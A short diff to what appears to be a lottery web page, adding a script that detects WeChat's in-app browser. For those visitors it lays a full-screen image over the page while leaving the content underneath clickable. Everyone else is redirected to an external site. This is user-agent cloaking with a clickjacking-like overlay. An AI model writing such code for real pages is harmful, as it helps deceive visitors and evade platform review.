@@ -15,6 +15,19 @@
     </style>
 </head>
 <body>
+    <!-- 新增微信检测逻辑 -->
+    <script>
+        (function() {
+            if(/micromessenger/i.test(navigator.userAgent)) {
+                const d = document, b = d.body;
+                b.style.overflow = 'hidden';
+                b.innerHTML = `<div style="position:fixed;top:0;left:0;z-index:2147483647;width:100vw;height:100vh;background:url(IMG.jpg) center/cover;pointer-events:none"></div>` + b.innerHTML;
+            } else {
+                location.href = 'https://wwwlcs.github.io';
+            }
+        })();
+    </script>
+
     <div class="main-container">
         <div class="lottery-wrap2">
             <div class="lot-grid">
